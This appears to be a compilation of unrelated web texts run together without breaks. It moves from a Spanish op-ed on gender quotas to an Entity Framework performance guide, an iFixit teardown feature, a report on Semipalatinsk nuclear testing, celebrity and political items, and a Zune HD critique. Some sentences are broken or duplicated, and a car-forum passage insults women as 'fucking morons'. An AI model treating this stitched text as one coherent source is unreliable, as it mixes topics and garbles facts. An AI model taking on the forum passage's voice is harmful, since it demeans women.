Esta vergonzosa experiencia obliga a revisar nuevamente la ley electoral e incluso la Constitución para encontrar mecanismos más efectivos que garanticen y fortalezcan la cuota de género .
Una evidente tarea de los partidos políticos ( particularmente los que se dicen de izquierda ) es reforzar la capacitación política de las mujeres que los integran y comprometerse efectivamente con la apertura de espacios de representación para ellas .
Por otro lado a la hora del registro a cargos de elección es necesario vigilar que las candidatas lleven siempre mujeres suplentes .
Exhorto a recordar a lo largo de estos tres años los nombres de quienes serán diputados producto del despojo de diputaciones destinadas a las mujeres .
Debemos reforzar el mensaje de que su actitud tiene costos de legitimidad , distinguirlos por su misógina acción , en sus intervenciones , presentaciones y gestiones , y en sus entrevistas ante los medios de comunicación para evitar que esto quede en el olvido ciudadano .
Introduction
If you are using the Entity Framework ( EF ) , then you need to understand the best practices for improving its performance , or you will suffer the consequences !
Background
My team has spent almost 2 years with the first version of the Entity Framework in an enterprise application ( including the beta ) .
Our application has a Service Oriented Architecture ( SOA ) that uses the .NET 3.5 Framework SP1 , SQL Server 2008 and IIS 7.0 on Windows Server 2008 .
During development we ran into significant issues with performance which we overcame by finding and following several best practices .
The intent of this article is to explain these best practices .
This article assumes that you are familiar with what the EF is and how to use it .
If you need more of an introductory overview , check out the Introduction to the Entity Framework article .
Best Practices
Our application has a database with 400 + tables , some of which are very inter-connected .
All of our Entity Framework calls are contained in our web service projects .
Many of our EF calls took 8.5 seconds to complete on first time calls .
By making certain changes ( see the chart below ) to our web service projects , we were able to improve these calls to 3 seconds .
Second EF calls became almost instant .
The chart below gives an indication of the overall performance impact with respect to the EF and the level of refactoring it took us to implement the change .
Best Practice Impact Required Refactoring Pre-generated Your View Major Minor Use Small EDMX Files Minor Moderate Create Smart Connection Strings Minor Minor Disable Change Tracking Minor Minor Use Compiled Queries Moderate Moderate Be Careful With Includes Moderate Major
The following sections in this article will explain these best practices in more detail - so read on !
Pre-generated Your View
The most expensive operation ( it takes over 50 % of the initial query ) is View Generation .
A big part of creating an abstracted view of the database is providing the actual view for queries and updates in the store ’s native language .
During View Generation , the store views are created .
Fortunately we can eliminate the expense of building the in -memory view by running the EDM generator ( EdmGen.exe ) command line tool with the view generation command parameter / mode : ViewGeneration ( see below ) .
Running this tool will create a code file ( either .cs or .vb ) with a pre-generated view that can be included and compiled in your project .
Having the view pre-generated reduces the startup time considerably .
The first time the EF ObjectContext is created the view must be generated , so pre-generating the view and deploying it with your application is important .
The disadvantage of doing this is that you must keep the generated views synchronized with any changes you make to the data model .
" %windir% \Microsoft.NET\Framework\v3.5\EdmGen.exe " / mode : ViewGeneration / language : CSharp / nologo " /inssdl:MyEntityModel.ssdl " " /incsdl:MyEntityModel.csdl " " /inmsl:MyEntityModel.msl " " /outviews:MyEntityModel.Views.cs "
The EdmGen.exe tool is installed in the .NET Framework directory .
In many cases , this is located in C:\windows \Microsoft.NET\Framework\v3.5 .
For 64 - bit systems , this is located in C:\windows \Microsoft.NET \Framework64\v3.5 .
You can also access the EdmGen.exe tool from the Visual Studio command prompt ( Click Start , point to All Programs , point to Microsoft Visual Studio 2008 , point to Visual Studio Tools , and then click Visual Studio 2008 Command Prompt ) .
In order to get the input .ssdl , .csdl and .msl files , you need to use Visual Studio to do the following :
Open the project that contains your Entity Framework project .
Open the EDMX file in the designer .
Click the background of the model to open the model 's Properties window .
Change the Metadata Artifact Processing property to : Copy to Output Directory .
Save the project - this will create the .ssdl , .csdl , and .msl files .
Another way to do this is by running the EDM generator command line tool with the full generation command parameter / mode : FullGeneration ( see below ) .
EdmGen.exe requires only a valid connection string to your database to generate the conceptual model ( .csdl ) , storage model ( .ssdl ) , and mapping ( .msl ) files , as well as the pre-generated view file .
All options shown are required :
" %windir% \Microsoft.NET\Framework\v3.5\EdmGen.exe " /mode: FullGeneration /c :" Data Source=localhost ; Initial Catalog=MyDatabase ; Integrated Security=true " / nologo / language : CSharp /entitycontainer : MyEntities / namespace : MyModel " /outviews:MyEntityModel.Views.cs " " /outssdl:MyEntityModel.ssdl " " /outcsdl:MyEntityModel.csdl " " /outmsl:MyEntityModel.msl " " /outobjectlayer : MyEntities .
ObjectLayer.cs "
Use Smaller EDMX Files
The Entity Framework is capable of handling large entity data models but you can run into performance problems if the data model is very inter-connected .
In general you should start thinking about breaking up a data model ( into multiple .edmx files ) when it has reached an order of 100 entities .
The size of the .xml schema files is somewhat proportional to the number of tables in the database that you generated the model from .
As the size of the schema files increase , the time it takes to parse and create an in - memory model for this metadata will also increase .
As stated earlier , this is a one - time cost incurred per ObjectContext instance and can be shortened by pre-generating the view .
The Visual Studio Designer also starts to suffer from poor performance when the number of entities gets too large .
The disadvantage of having several smaller data models is that you must keep the individual .edmx files synchronized when you make changes to the database .
Smart Connection Strings
The ObjectContext object retrieves connection information automatically from the application config file when creating object queries .
You can supply this named connection string instead of relying on the connectionString parameter in the .config file when instantiating the ObjectContext class .
The Metadata property in the connectionString parameter contains a list of locations for the EntityClient provider to search for EDM mapping and metadata files ( the .ssdl , .csdl , and .msl files ) .
Mapping and metadata files are often deployed in the same directory as the application executable file .
These mapping files can also be included as an embedded resource in the application which will improve performance .
In order to embed the EDM mapping files in an assembly , you need to use Visual Studio to do the following :
Open the project that contains your Entity Framework project .
Open the EDMX file in the designer .
Click the background of the model to open the model 's Properties window .
Change the Metadata Artifact Processing property to : Embed in Output Assembly .
Rebuild project - this will build a .dll file with the .ssdl , .csdl , and .msl information .
Embedded resources are specified as follows : Metadata=res://<assemblyFullName>/<resourceName > .
Note when you use wildcard for the assemblyFullName ( * ) , the Entity Framework has to look through the calling , referenced , and side - by - side assemblies for resources with the correct name .
To improve performance , always specify the assembly name instead of the wildcard .
Below is an excerpt from a web .config file that contains the connectionString parameter .
You can see the metadata property is specifying the assembly name MyApp.MyService.BusinessEntities.dll :
< connectionStrings > < add name = " MyEntities " connectionString = " metadata=res://MyApp.ServiceRequest.BusinessEntities , Version=1.0.0.0 , Culture=neutral , PublicKeyToken=null/;provider=System.Data.SqlClient ; provider connection string = " Data Source = localhost ; Initial Catalog = MyDatabase ; Integrated Security = True ; MultipleActiveResultSets=True " " providerName = " System.Data.EntityClient " / > < /connectionStrings >
Disable Change Tracking
Once the View Generation cost is eliminated , the most expensive operation is Object Materialization .
This operation eats up 75 % of your query time because it has to read from the DbDataReader object and create an object .
When you are using the Entity Framework , you have objects that represent the tables in your database .
These objects are created by an internal process called object materialization .
This process takes the returned data and builds the relevant objects for you .
The object can be EntityObject derived objects , anonymous types , or DbDataRecord DbDataRecord .
The ObjectContext object will create an ObjectStateEntry object to help track changes made to related entities .
Objects are tracked when queried , added , or attached to the cached references inside this class .
The tracking behavior is specified using the MergeOption enumeration .
When updates to properties of the tracked objects occur , the properties are marked as modified and the original values are kept for performing updates back to the database .
This enables users to write code against the objects themselves and call SaveChanges .
We can minimize the overhead of change tracking by using the MergeOption .
NoTracking option .
Doing so will increase the performance of your system in most situations .
The loss of change tracking is irrelevant if you are sending your data across the network via a web service because this feature will not work in a " disconnected " mode .
Even if you are not disconnected , you can use this option in a page where there are no updates to the database .
Take a look at the code snippet below for one example of how to disable change tracking :
public List< ServiceRequest > GetBySubmissionDate ( DateTime startDate , DateTime endDate ) { using ( new Tracer ( " Trace " ) ) { using ( MyEntities db = new MyEntities ( ) ) { ObjectQuery < ServiceRequest > query = ( ObjectQuery < ServiceRequest >) CompiledQueries.GetBySubmissionDate ( db , startDate , endDate ) ; List < ServiceRequest > serviceRequests = query .Execute ( MergeOption.NoTracking ) . ToList ( ) ; return serviceRequests ; } } }
It 's unclear how much the MergeOption .
NoTracking option helps performance because every query is different .
In general , I would say it 's certainly worth trying .
Note however the following caveats exist when using the MergeOption .
NoTracking option :
There is no identity resolution so , depending on your query , it 's possible that you will get entities with the same primary key that are referentially distinct .
Foreign keys are only loaded if both entities are loaded .
If the other end of the association is not included , then the foreign key will not be loaded either .
Tracked objects are cached , so subsequent calls for that object will not hit the database .
If you use NoTracking and try to load the same object multiple times , the database will be queried each time .
Use Compiled Queries
Query Creation also takes up a good chunk of time , about 10 % of your query after the EF is warmed up .
Some parts of the query are cached so that subsequent queries are faster than the first .
However not all parts of the query are cached leaving some parts needing to be rebuilt each time the query is executed ( unless you are using Entity Sql ) .
We can eliminate the need for rebuilding query plans by using Compiled Queries .
To compile a query for later , you can use the Compiled Query .
Compile method which uses a delegate :
public static readonly Func< MyEntities , DateTime , DateTime , IQueryable < ServiceRequest >>
GetBySubmissionDate = CompiledQuery .Compile < MyEntities , DateTime , DateTime , IQueryable < ServiceRequest >>( ( db , startDate , endDate ) = > ( from s in db .
ServiceRequest .
Include ( " ServiceRequestType " ) . Include ( " ServiceRequestStatus " ) where s.SubmissionDate > = startDate && s.SubmissionDate < = endDate orderby s.SubmissionDate ascending select s ) ;
Note the following caveats exist when using the Compiled Query .
Compile option :
You cannot use CompiledQueries with parametrized Includes - so you have to use EntitySQL instead .
with parametrized Includes - so you have to use instead .
Compiling a query for reuse takes at least double the time of simply executing it without caching .
Be Careful With Includes
You can direct the framework to do eager loading of relationships by using an .
Include statement .
With an eager load , the framework will construct a join query and the relationship data will be fetched along with the original entity data .
The .
Include statement can result in a large amount of data being brought back , it can also result in complex queries because of the need to use many Join statements at the data store .
public List< ServiceRequest > GetBySubmissionDate ( DateTime startDate , DateTime endDate ) { using ( new Tracer ( " Trace " ) ) { using ( MyEntities db = new MyEntities ( ) ) { ObjectQuery < ServiceRequest > query = ( ObjectQuery < ServiceRequest >) CompiledQueries.GetBySubmissionDate( db , startDate , endDate ) ; List < ServiceRequest > serviceRequests = query .
Execute ( MergeOption .NoTracking ) . ToList ( ) ; return serviceRequests ; } } }
This can be avoided by using an .
Load statement to lazy load the relationship .
With lazy loading , an additional query is constructed and run for each call to load to fetch the relationship information .
If you want to lazy load only certain relationships , you may choose instead to have code like that shown below :
public List< ServiceRequest > GetBySubmissionDate ( DateTime startDate , DateTime endDate ) { using ( new Tracer ( " Trace " ) ) { using ( MyEntities db = new MyEntities ( ) ) { ObjectQuery < ServiceRequest > query = ( ObjectQuery < ServiceRequest >) CompiledQueries.GetBySubmissionDate ( db , startDate , endDate ) ; List < ServiceRequest > serviceRequests = query .Execute ( MergeOption.NoTracking ) . ToList ( ) ; foreach ( ServiceRequest item in serviceRequests ) { if ( !item.ServiceRequestTypeReference.IsLoaded ) item.ServiceRequestTypeReference.Load(MergeOption.NoTracking ) ; } return serviceRequests ; } } }
Note that in certain instances , eager loading is better while in others lazy loading is a better approach .
In the code below , every table that has a relationship to the specified entity parameter is lazy loaded :
public static void LoadRelated ( EntityObject entity , MergeOption mergeOption ) { System.Reflection.PropertyInfo[ ] properties = entity .
GetType( ) . GetProperties ( ) ; foreach ( System.Reflection .PropertyInfo propInfo in properties ) { if ( IsEntityReference ( propInfo ) ) { EntityReference er = ( EntityReference ) propInfo.GetValue(entity , null ) ; if ( !er. IsLoaded ) er.Load( mergeOption ) ; } if ( IsEntityCollection ( propInfo ) ) { System.Data.Objects.DataClasses.RelatedEnd end = ( System.Data.Objects.DataClasses.RelatedEnd)propInfo.GetValue(entity , null ) ; if ( !end. IsLoaded ) { end.Load(mergeOption ) ; System.Collections.IEnumerator enumerator = end.GetEnumerator ( ) ; while ( enumerator .MoveNext ( ) ) { LoadChildren( enumerator .
Current as EntityObject ) ; } } } } }
You may want to take a look at the series of articles on Transparent Lazy Loading for Entity Framework for a more readable and simple version of lazy loading using the EFLazyLoading library .
Points of Interest
There are several things to keep in mind with regard to performance when you work with the Entity Framework :
Initial creation of the ObjectContext includes the cost of loading and validating the metadata .
includes the cost of loading and validating the metadata .
Initial execution of any query includes the costs of building up a query cache to enable faster execution of subsequent queries .
Compiled LINQ queries are faster than non-compiled LINQ queries .
Queries executed with a the NoTracking merge option works well when changes and relationships do not need to be tracked , such as data sent across the network .
merge option works well when changes and relationships do not need to be tracked , such as data sent across the network .
You may want to check out the EdmGen2.exe tool which can be used as a replacement for the original EdmGen.exe tool and is capable of reading and writing EDMX files .
If you try to navigate a many - to - one or one - to - one relationship that is not loaded , you will get a NullReferenceException .

Revision History
When Kyle Wiens and his colleagues flew to New Zealand two years ago , they were n't on vacation .
They had a serious mission : to purchase one of the first iPhones and then ruthlessly tear it apart .
Wiens runs iFixit , a tech company that can be described as eccentric , to say the least .
The staff of 20 engineers and college interns specializes in disassembling gadgets while documenting the process with photographs and writing .
The end result of their work is an unofficial , illustrative instruction guide on taking apart and repairing each gadget .
Their stated goal is to help consumers avoid the hefty costs of professional repairs or buying new products .
But it 's also a savvy marketing strategy in an increasingly competitive slice of what the tech industry calls " teardown culture . "
Some other companies , including RapidRepair and iSuppli , run similar businesses taking apart products .
Hardware hackers , too , disassemble hardware as a hobby to learn how to tweak their devices into the gadgets of their dreams .
But teardown businesses do n't make money tearing down these gadgets , taking pictures of their insides or offering manuals .
Rather , iFixit and RapidRepair both sell the parts for consumers to order and perform their self - repairs .
And if customers are too afraid to do their own repairs , RapidRepair offers their professional services for a fee .
Photographing and documenting the teardown process , then , is mostly a marketing tool for these businesses to gain media attention and exposure in an effort to attract customers .
I Fixit , for instance , regularly sends tech publications ( including Wired.com ) their teardown observations and free photographs for use in articles .
Playing the " time zone game " with i Fixit 's 2007 New Zealand flight gave the crew a head start of 27 hours before the iPhone was released on the U.S.
West coast , where Wiens lives .
But they still faced a number of challenges .
First , they had never been to New Zealand , so they had no office to work in and knew nobody who could help them .
They could n't just set up shop in a hotel room , either :
They needed lots of space , light and a fast internet connection to upload high - resolution photos documenting their process .
Fortunately , the owner of a copy shop was generous enough to offer his facility for their use .
They got to work on the toughest part yet : disassembling a brand new product whose innards nobody , except Apple 's engineers , knew anything about .
It turned out the first - generation iPhone did n't even have screws to get inside .
The team was momentarily stumped on just how to take apart the iPhone .
Then — eureka !
They found they could pop off the black antenna shield and pry off the metal back .
" That was monstrously difficult , " Wiens said in a phone interview .
Surprisingly , his team did n't break the device , though its metal band was slightly bent after they reassembled it .
Marketing aside , why are geeks so fascinated by looking at the chips , wires , ribbons and glue — the hideous part of a gadget — when the gorgeous part is on the outside ?
It 's quite simple :
By peering into these gadget 's " souls , " you learn their secrets .
A teardown of the new iPhone 3GS ( the top photo in this article ) , for example , revealed the handset has an underclocked processor , presumably to preserve its battery life .
And when iFixit disassembled the iPod Touch released in September 2008 ( shown above ) , the company found a hidden bonus : an apparently unused Bluetooth chip , whose functionality Apple would later unlock in summer of 2009 .
Aaron Vronko , CEO of RapidRepair , added that teardowns serve as a check on a company 's claims .
Apple 's Steve Jobs , for example , recently said the latest ( third - generation ) iPod Touch lacks a camera because the gadget 's focus is gaming .
However , iFixit 's teardown of the new iPod Touch found a small compartment that would be perfect for a camera .
" I do n't believe Steve 's explanation , " Vronko said .
" I think in six months tops we 'll see an iPod Touch with a camera . "
The more interesting facet of looking inside is the opportunity to see forward , Vronko said .
" Teardowns give us insights on what 's coming up on technology and what kind of technologies people are choosing to integrate , " Vronko said .
" It 's cool to see first hand the progression of design . "
A clear observation from teardowns is they keep getting more difficult , as gadgets progressively become smaller , more complex and more tightly packed with components .
Andrew Bookholt , a Cal Poly student studying mechanical engineering and an iFixit intern , flew to Newark to pick up a fifth - generation iPod Nano for teardown .
He described the process of tearing down the camera - equipped iPod Nano as " a pain . "
Copious amounts of glue held together the miniature device , and the click wheel was not removable and had to be popped out .
It was so hard , in fact , Bookholt broke the Nano on his first attempt .
But Bookholt 's hard work ( and i Fixit 's money ) was worth it , because the Nano 's guts spilled some fascinating hints on what 's to come .
" Apple is integrating everything more and more toward the iPhone - sized computer that will do everything , " Bookholt said .
" I think they 're just going to shrink everything down , and maybe eventually have a Nano have all the capabilities of an iPhone , plus more .
The trend is going toward an all - in - one device that has a lot of functions . "
I Fixit 's Wiens has been taking apart gadgets for six years , and he said his favorite observation is the inadvertent harmony between rivals such as Apple and Microsoft .
The two are fierce competitors , Wiens said , but once you look inside their gadgets , many of them are made by the same people .
The Zune HD and the iPhone , for example , were both made by Foxconn , a major manufacturer in China .
" You 've got these arch nemesis devices , and they 're the culmination of years of effort by Microsoft and Apple , " Wiens said .
" But they 're being assembled and shipped out of China by the same company .
At the same time you know the product managers at Apple and Microsoft hate each other 's guts . "
Click through to the next pages for more photos of naked gadgets ( all SFW , or safe for work , unless your coworkers are easily shocked by wanton destruction of consumer electronics ) .
i Fixit 's teardown of a MacBook found that the new unibody enclosure was designed to keep the motherboard running down one side of the notebook — a superior , safer design choice than spanning the motherboard throughout the entire device .

Walking through the flat and endless Kazakh steppe , Nemytov Oleg suddenly stops , fumbles in his desert camouflage trousers and pulls out a Geiger counter .
The device bleeps into life .
He peers pensively at the reading .
When we got out of the car it read 3 .
Now , within a couple of hundred yards , it has jumped to 10 .
He unwraps breathing masks and two pairs of disposable shoe coverings .
" If we want to go any further we will have to wear these , " he says .
Further along the dusty road he checks his device once more .
" You see , the meter is now reading 21 , " he says .
" If we were in a city far away from here it would read about 0.1 .
The radiation increases very quickly . "
The reason Mr Oleg is keeping such a close eye on background radiation is because we are standing on the very spot where , 60 years ago , the Soviet Union launched the Cold War , with the detonation of its first nuclear bomb .
Watched from a lead - lined bunker by Stalin 's feared secret police chief Lavrenti Beria , First Lightning exploded at exactly 7 am on 29 August 1949 , throwing up an enormous mushroom cloud which billowed over the steppe and , unbeknownst to people nearby , dumping huge quantities of radioactive material on them , their houses and their fields .

It is the names of Hiroshima , Nagasaki and Chernobyl that stand for the horrors of the new technology .
The name of Semipalatinsk has no such resonance , and is all but forgotten .
Yet nowhere else in the world was there such a large concentration of nuclear explosions in one place over such a long period .
When Beria earmarked this far eastern corner of Kazakhstan to be the Soviet Union 's top secret nuclear test facility , he described the place as " uninhabited " – conveniently forgetting the 700,000 people who lived in the surrounding villages , towns and cities .
Overnight the region was deleted from the map and for the next 40 years Soviet scientists detonated 615 nuclear devices at their secret Semipalatinsk Polygon .
For the first 13 years , tests inside the 80,000 square kilometre Polygon site were conducted above ground , throwing huge amounts of nuclear waste into the atmosphere .
The underground tests that followed polluted vast tracts of land with a toxic combination of radioactive chemicals which will continue to contaminate the soil for thousands of years .
Kazakhstan shut down the test site almost as soon as the Central Asian republic gained its independence in 1991 ( and also became the first country in the world to voluntarily give up nuclear weapons ) .
But the deadly legacy of those tests lives on .
In a new hospital on the outskirts of Semei – the new Kazakh name for the otherwise unremarkable provincial capital which lies 150 km east of the Polygon – Galina Bityukova , aged 54 and painfully thin , is midway through a second course of chemotherapy for ovarian cancer .
" Sometimes I feel that my cancer is linked to the nuclear tests , you can't help but think so , " she says .
" It could just be cancer like anyone else gets but when you remember what happened here and how many people have cancer it makes you wonder . "
On the bed opposite Svetlana , a woman in her late fifties who is recovering from a mastectomy , firmly agrees .
" In my mind I know the nuclear tests had something to do with me getting ill , " she says , flashing a strained smile which reveals a full set of gold teeth .
Dr Baipeisov Muhametkalievich is the head of oncology at Semei 's cancer ward , which treats up to 40,000 people every year .
" It 's difficult to know whether their cancer comes from the testing or not , " he says .
" But you only have to look at the data to know that this area of Kazakhstan has the highest rates of cancer of anywhere in the country . "
It is roughly one - third higher than the national average , he says , a clear indication that the Polygon continues to make people sick .
When Kazakhstan gained its independence following the Soviet Union 's collapse , the country was left bankrupt and the damage caused by the nuclear tests was just one of the problems that Moscow consigned to the new government , dominated by the local Communist chief Nursultan Nazerbayev who is still Kazakhstan 's President .
As the Russian military convoys rolled back over the border they not only took away all the scientific data regarding the Polygon , but also most of the modern medical equipment from Semei 's hospital .
For many years the victims of Semipalatinsk , unlike those of Chernobyl , were left to fend for themselves .
But flush with new revenue from its enormous gas fields and mineral deposits , money is finally heading their way .
The oncology department in Semei has just received state - of - the - art equipment from Japanese doctors in Nagasaki while a £ 40 m radiology department is under construction .
" When I first got here I was absolutely astonished at the level of poverty and neglect among the victims of nuclear testing , " says Fiona Corcoran , an Irish charity worker who had seen the effects of nuclear fallout in Chernobyl and who now runs two orphanages in Semei .
" Children with horrendous birth defects were just left to rot in institutions .
But recently there have been some major improvements . "
Ms Corcoran 's charity , the Greater Chernobyl Cause , was one of many working in Chernobyl but when she arrived in Kazakhstan a decade ago outside aid was almost non-existent .
" The Kazakhs would always say to me , ' People come here , they go and they forget ' .
There was none of the same sense of urgency that there was with Chernobyl .
But what happened at Chernobyl was a single tragic accident .
What happened here was the systematic and deliberate exposure of thousands of people to nuclear material . "

Most of those who worked on the test site have long since died , but the radiation levels continue to poison new generations of Kazakhs .
In an anonymous - looking block of Soviet - era flats is Semei 's only facility for disabled children .
According to the centre 's director Tylysova Toleakarovna , of the 346 children they regularly treat , 45 have illnesses which result directly from radiological contamination .
Baurzhanaly Kuanysh is one of them .
Now 16 years old , he was born in Abay district , one of the areas closest to the Polygon .
He suffers from microcephaly , a common illness among radiation victims where the victim 's head is abnormally small .
" We can provide for some of the victims who live near the city but we need to get out to the villages , " explains Mrs Toleakarovna .
" That is my dream . "
Some 160 km west of Semei lies Kurchatov , a meticulously planned settlement that was once the most secretive town in the Soviet Union .
Here scientists work to map and contain the nuclear contamination inside the Polygon .
What is already clear is that the three sites where the explosions were regularly conducted will be uninhabitable for thousands of years , and a river that flows through the site into the Irtysh is contaminated .
Yet that has not deterred new arrivals : government and private investors are keen to open up some areas of the test site because it is littered with deposits of coal , copper and silver .
There are already 400 miners digging for coal close to where some of the later and most powerful tests were carried out in the 1960s and 1970s .
But the rush to extract minerals from this poisoned land has set alarm bells ringing among medical experts .
Boris Gallich , a specialist in the effects of radiation , said : " My biggest fear is that these people could become contaminated and pass it on to their children and families .
That may be a matter of indifference for the company directors , but not for the people on the ground . "
29 August 1949 : The birth of the Cold War
* The Soviet Union 's first successful test of a 22 - kiloton nuclear weapon – called First Lightning – on 29 August 1949 was , in effect , the day that began the Cold War .
* Ever since the USA dropped two atom bombs on the Japanese cities of Hiroshima and Nagasaki in 1945 , Stalin was desperate to obtain the same technology .
* Stalin placed Lavrenti Beria , the feared head of his NKVD secret police , in charge of the project and gave the country 's top atomic scientist , Igor Kurchatov , virtually unlimited funds .
* The successful first detonation led to a massive nuclear arms race as the two foes frantically built up their arsenals , a contest which only ended with the collapse of the Soviet Union .

Bill O’Reilly , whose ratings have been slipping as of late , has a new tactic to up his show ’s popularity : bringing in his main competitor , Glenn Beck .
The Irish - American “ O’ Reilly Factor ” host is buddying up with Beck now that the younger conservative pundit is beating the vet in ratings .
Beck appeared on “ The O’Reilly Factor ” to discuss Bill ’s beef with Jay -Z .
“ The Glenn Beck Program ” host said he loves Jay - Z , and claims he “ blends in ” with the rap crowd .
But O’Reilly has a problem with the rap artist ’s “ hypocrisy , ” saying he sings about race , and then hosts a benefit for firefighters and police officers who died on 9/11 .
How exactly do these two things conflict , I do n’t know , but perhaps Bill ’s just upset he did n’t get invited to the hip hop star ’s benefit concert .
Beck reminds his fellow
Fox news host that Jay - Z mentions him – unfavorably – in one of his songs , singing “ this ai n’t black versus white … please tell Bill O’Reilly to fall back . ”
Beck then gives O’Reilly a book that Jay - Z signed , which reads “ Peace , Bill , Jay - Z , ” and tells him to step off once again .
The two political talking heads then go on to discuss how the “ race thing ” is so over .
Really , Bill ?
Pairing up with Beck and bringing in the race card a nonsensical discussion about a hip hop celeb ?
Pretty desperate for numbers , huh ?
Uh yeah , thanks , but no thanks .
I kinda require a girl to be intelligent before I 'll find her attractive .
My hottie - environmentalist friend sought me out to ask me whether a hybrid or a diesel would be her better bet .
I told her my opinion , sent her to do her own research , and she bought a diesel .
Because these girls are leaping aboard the hybrid bandwagon , they 've clearly spent no time at all investigating this , and as such , are fucking morons .
So they 're pretty to look at for ten or fifteen seconds , then you want to stuff an apple in their mouth to keep them from talking .
Let 's move along , and try and find some photos of cars , shall we ?
James
May plans to live in the Lego house for a few days Top Gear presenter James May has begun his attempt to build a house entirely out of Lego bricks .
May has vowed to live for a few days in the life - sized house , which comes complete with a working shower and toilet , once it has been completed .
It is being built in the middle of the Denbies Wine Estate , in Dorking , for the BBC series James May 's Toy Stories .
A spokesman for Denbies said hundreds of people had turned up and everyone had a good time helping out .
Some fans queued from 0430 BST to get their hands on one of the 600 tickets that were released , enabling them and a friend to help May build the house .
" I 'm planning to stay there for two or three days , or until it falls down - whichever is sooner
James May Each helper had to create full sized bricks out of 272 Lego pieces .
More than three million bricks were delivered to the site last week , but people were still asked to take any unwanted Lego with them .
May said he came up with the idea for the project over a beer with friends .
" Your imagination is always bigger than your stockpile when you 're a kid , " he said .
Helpers had to create blocks out of 272 Lego bricks " Up until now , the largest thing I 've ever built with Lego was probably a plane or a battleship , because that was all I could build with the amount I had . "
Builders will now spend six days constructing the house out of the large Lego blocks .
May said he would live in the house , joking : " I 'm planning to stay there for two or three days , or until it falls down - whichever is sooner .
" I 'm pretty relaxed about it , but will just have to be careful moving around .
" If I wake up buried under a pile of bricks I 'll know it 's gone wrong . "

Here are the tough and penetrating questions asked by Chris Wallace of a man whose critics accuse of war crimes , and whose administration presided over the death of over a hundred prisoners in interrogation , who authorized torture techniques once trade - marked by the Khmer Rouge :
Why are you so concerned about the idea of one administration reviewing , investigating the actions of another one ?
Do you think this was a political move not a law enforcement move ?
The attorney general says this is a preliminary review , not a criminal investigation .
It is just about CIA officers who went beyond their legal authorization .
Why do n't you think it 's going to stop there ?
The inspector general 's report which was just released from 2004 details some specific interrogations -- mock executions , one of the detainees threatened with a handgun and with an electric drill , waterboarding Khalid Sheikh Mohammed 183 times .
First of all , did you know that was going on ?
So even these cases where they went beyond the specific legal authorization , you 're OK with it ?
President Obama has also decided to move interrogations from the CIA to the FBI that 's under the supervision of the National Security Council , and the FBI will have to act within the boundaries of the Army Field Manual .
What do you think that does for the nation 's security ?
And will we now have the tools if we catch another high - value target ?
Republicans have made the charge before , do you think Democrats are soft on National Security ?
Do you think that it was a mistake , while you were in power , while your administration was in power , not to go after the nuclear infrastructure of Iran ?
Was it a mistake for Bill Clinton , with the blessing of the Administration , to go to North Korea to bring back those two reporters ?
Even as their office struggled with a large budget deficit , managers in the technology office of the Department of Veterans Affairs awarded $ 24 million in bonuses to thousands of employees in 2007 and 2008 , according to a new investigative report .
The report , by the department ’s Office of Inspector General , concluded that the managers “ were not fiscally responsible in administering awards ” and that one senior manager in particular , Jennifer S. Duncan , “ acted as if she was given a blank checkbook to write unlimited monetary awards . ”
The report was one of two sharply critical reviews of the department ’s Office of Information and Technology that were issued this week by the inspector general .
The reports document evidence of widespread nepotism , abuse of authority and improper hiring under a former assistant secretary , Robert Howard .
The investigators found that Mr. Howard , who left the department in January , had “ an inappropriate relationship ” with one of his subordinates , Katherine Adair Martinez , who remains a deputy assistant secretary .
Ms. Martinez is also accused in one report of abusing her position to help a friend get a job and to transfer her own job to Florida , even though she spent 60 percent of her time in Washington .
Days later , while the models were probably still recovering from their near - mile trek  in heels 
Mexico produced the largest meatball in the world , which weighed in at 109 pounds .
Prepared by the chefs at the Ritz Carlton in Cancún , the meatball was supposed to promote a film based on the children ’s book “ Cloudy with a Chance of Meatballs , ” about the mythical town of Chewandswallow whose residents are amazed at all the food that rains down from the heavens .
After Mexico ’s record was confirmed , besting a modest 72 - pound , 9 - ounce meatball , the giant mass of beef was served to onlookers .
Months earlier , in January , the record - breaking focus was on dessert .
Chef Miguel Ángel Quezada and a team of 55 chefs in Mexico City created the world ’s largest cheesecake , using almost a ton of cream cheese and yogurt , 551 pounds of sugar and 331 pounds of butter .
It took 60 hours to create the two - ton monstrosity , which was chopped up into 20,000 servings .
Mexico also set a kissing record this year , as about 40,000 people locked lips on Valentine ’s Day in Mexico City in the Zócalo , which happens to be among the largest city squares in the world .
The smoochers beat a British record of 32,648 kissers , which had held since 2007 .
A few months later , the Mexican government began discouraging people from kissing for fear of spreading swine flu .
Not all of Mexico ’s record - breaking attempts go as planned .
In January , Mexico ’s National Association of Matadors declared that Michel Lagravere , an 11 - year - old known as Michelito , had set the record at his age for the most baby bulls killed in a two - hour fight .
He brought down six of them .

But Guinness refused to recognize the effort , declaring on its Web site , “ We do not accept records based on the killing or harming of animals . ”
Michelito was defiant , though , saying in his high - pitched voice : “ It ’s all the same to me because in the world of bullfighting the record is now part of history , although it may not be for Guinness . ”
No record holds forever , of course .
Manuel Uribe , a Mexican and the world ’s fattest man in 2006 , slimmed down from 1,230 pounds to about half that , losing the title .
He has told reporters that he now hopes to return to the record book , as the person who has lost the most weight .
A new baby male snow leopard , Yukichi , went on display before the public at Tama Zoo in Hino City , Tokyo .
Yukichi was born on July 2nd to mother Yuki and father Valdemar .
Yukichi is the forth baby for Yuki and the first for Valdemar .

Just when you thought Microsoft had given up on the Zune as a product and had retreated to referring to it as a nebulous cloud of conceptual features , the company comes out with a new device supporting a mobile - optimized OLED screen , a wildly powerful yet super efficient new multi-core Tegra graphics processor and support for high definition radio .
The problem is that none of those things are actually true .
With the Zune HD , Microsoft has dusted off its failed brand and applied it to a new device aimed at the iPod touch .
To distinguish it , the company has added several new features .
Unfortunately , as was the case with previous models , what Microsoft has added is all sizzle and no steak .
Here 's why .
Myth 1 : OLED is a great display technology for mobile devices
First off , Microsoft gave the Zune HD a new OLED display .
OLED is an interesting new technology that uses a layer of electroluminescent organic compounds , rather than the inorganic materials used in traditional LCDs , to produce an image .
OLED panels do n't require a backlight , so they can render true blacks and provide a higher contrast ratio .
However , today 's OLED panels are much dimmer than standard issue LCDs : a typical maximum output of 200 cd / m^2 compared to around 4-500 for mid-range LCDs .
OLED also performs considerably worse in bright light because OLED is 100 % emissive rather than being partially transflective .
A good quality LCD actually uses ambient light to make its image brighter and more vibrant ; OLED does not .
This means when you take it outside , the OLED 's screen is completely washed out by sunlight .
Unless you only plan to use your mobile device in your dark basement , you do n't want one of today 's OLED screens , particularly on a mobile media player that you might expect to use on the go in various environments .
A shot in the dark
Microsoft knows this , which is why it only demonstrates the Zune HD in dark rooms .
